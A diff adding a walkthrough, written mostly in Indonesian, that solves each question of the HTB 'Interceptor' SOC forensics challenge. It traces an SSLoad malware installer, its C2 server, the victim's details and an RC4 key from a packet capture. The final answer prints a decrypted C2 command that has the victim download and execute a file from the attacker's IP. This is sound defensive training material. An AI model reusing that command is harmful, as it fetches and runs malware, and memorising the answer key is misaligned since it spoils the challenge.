@@ -1,0 +1,88 @@
+HTB ROOM "INTERCEPTOR" SOC CATEGORY
+
+Sherlock Scenario
+
+A recent anomaly has been detected in our network traffic, suggesting a potential breach. Our team suspects that an unauthorized entity has infiltrated our systems and accessed confidential company data. Your mission is to unravel this mystery, understand the breach, and determine the extent of the compromised data.
+
+Download file dan cek file dengan wireshark, mulailah analisa sederhana,
+
+-Q1 : What IP address did the original suspicious traffic come from?
+Bagaimana cara temukan? pertama kita harus mencari IP Address yang memicu suspicious traffic, kemungkinan sering terjadi di bagian POST karena bagian ini dipakai untuk membawa data masuk 
+maka dari itu kita filter wireshark dengan: http.request.method == "POST"
+setelah difilter analisa pada bagian info paket disitu ada satu paket yang berbeda sendiri yaitu terdapat JSON (application/json)
+kita lihat packet detail bagian Internet Protocol Version 4, disampingnya anda akan lihat Src:
+Answer: 10.4.17.101
+
+-Q2 : The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?
+Bagaimana cara temukan? karena keterangan nya menggunakan HTTP method berarti kita harus spesifik pada perintah HTTP
+kita gunakan filter HTTP: http.request.method in {PROPFIND, OPTIONS} 
+karena metode POST sudah dipakai sebagai beacon malware, jadi alasan kita pakai filter adalah
+Penyerang yang ingin melihat daftar file di server WebDAV biasanya pakai PROPFIND atau minimal OPTIONS untuk ngetes fitur WebDAV tersedia.
+setelah filter kita akan dapat analisa info paket, dan yang paling menonjol pada info avp.msi itu bukan terlihat file system normal karena .msi = installer Windows, sering dipakai malware disguised sebagai antivirus ("avp").
+dan disitu Method nya menggunakan PROPFIND
+Answer: PROPFIND
+
+-Q3 : It appears that this file is malware. What is its filename?
+Bagaimana cara temukan? berdasarkan hasil analisa metode PROPFIND kita tahu ada file system tidak biasa bernama
+Answer: avp.msi
+
+-Q4 : What is the SSDEEP hash of the malware as reported by VirusTotal?
+Bagaimana cara temukan? Kita akan cari aktivitas yang berkaitan dengan HTTP pada IP Attacker maka dari itu gunakan filter: http && ip.addr == 10.4.17.101
+kita kemenu File - Export Objects - HTTP... Disitu terlihat jelas ada 3 file avp.msi ada satu file size lebih besar kemungkinan itu suspect utama.
+kita ketuk file itu kita save, kemudian kita convert to hash sha256, dan copy hash dan kita buka virustotal.com masukkan hashnya
+dibagian detail tertera hash SSDEEP.
+Answer: 24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz
+
+-Q5 : According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?
+Bagaimana cara temukan? arahkan halaman virustotal ke community dan lihat komentar dari NeikiAnalytics disitu tertera family dari malware
+Answer: ssload
+
+-Q6 : What is the creation time of the malware?
+Bagaimana cara temukan? Masih dihalaman virustotal cek pada menu details dan history disitu tertera waktu creation
+Answer: 2009-12-11 11:47:44
+
+-Q7 : What is the domain name that the malware is trying to connect with?
+Bagaimana cara temukan? Berdasarkan soal kita diminta mencari domain yang berarti itu adalah ranah dns, kita harus memfilter wireshark yang berkaitan dengan dns
+dengan dns.qry.name disitu akan tertampil domain-domain yang diresolusi oleh mesin korban. Dibagian info kita harus menganalisa domain yang suspicious
+Hampir semua domain yang muncul adalah milik Microsoft atau layanan OS yang sah, tetapi ada satu domain yang menonjol, dan sama sesuai format jawaban
+Answer: api.ipify.org
+
+-Q8 : What is the IP address that the attacker has consistently used for communication?
+Bagamana cara temukan? Anda bisa temukan dengan lihat aktivitas pada bagian destination dengan filter yang berkordinasi dengan ip korban di Q1
+ini filternya: ip.src == 10.4.17.101 || ip.dst == 10.4.17.101 
+kamu juga bisa fokuskan pada bagian HTTP karena yang kita tahu penyerang melakukan serangan lewat HTTP di bagian destination akan terlihat modus dari ip penyerang
+Answer: 85.239.53.219
+
+-Q9 : Which file, included in the original package, is extracted and utilized by the malware during execution?
+Bagaimana cara temukan? Buka kembali halaman virus total pada bagian menu Relations - Dropped Files terdapat pada bagian name 
+itulah file yang include pada original package sesuaikan saja formatnya atau pilih yang terbaru 
+Answer: forcedelctl.dll
+
+-Q10 : What program is used to execute the malware?
+Bagaimana cara temukan? Dihalaman virustotal Behavior - Processes created kamu akan temukan program yang digunakan sebagai eksekusi 
+filter hanya modus atau yang sering digunakan.
+Answer: msiexec.exe
+
+-Q11 : What is the hostname of the compromised machine?
+Bagaimana cara temukan? Gunakan filter ini untuk temukan paket http.request && ip.src == 10.4.17.101 && ip.dst == 85.239.53.219
+klik kanan pada file application/json Follow - HTTP Stream baca isi paket disana anda akan temukan hostname
+Answer: DESKTOP-FWQ3U4C
+
+-Q12 : What is the key that was used in the attack?
+Bagaimana cara temukan? masih dihalaman HTTP Stream filter text spesifik key anda akan temukan jawabannya
+Answer:  WkZPxBoH6CA3Ok4iI
+
+-Q13 : What is the os_version of the compromised machine?
+Bagaimana cara temukan? sama seperti tahap sebelumnya cek di HTTP Stream kamu akan temukan
+Answer: Windows 6.3.9600
+
+-Q14 : What is the owner name of the compromised machine?
+Bagaimana cara temukan? cari atau filter owner di HTTP Stream
+Answer: Nevada
+
+-Q15 : After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?
+Bagaimana cara temukan? Sekarang kita di HTTP Stream melihat ada pola penggunaan Base64 jadi kita 
+kemungkinan kita harus dekripsi dan kita temukan dibagian job itu tipe blob Base64,
+kemudian kita akan memasaknya dengan CyberChef, dengan resep From Base64 dan RC4 
+di phrassess RC4 masukkan key yang didapatkan pada Q12 masukkan input dan bake dan masakan siap dihidangkan!
+Answer: {"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
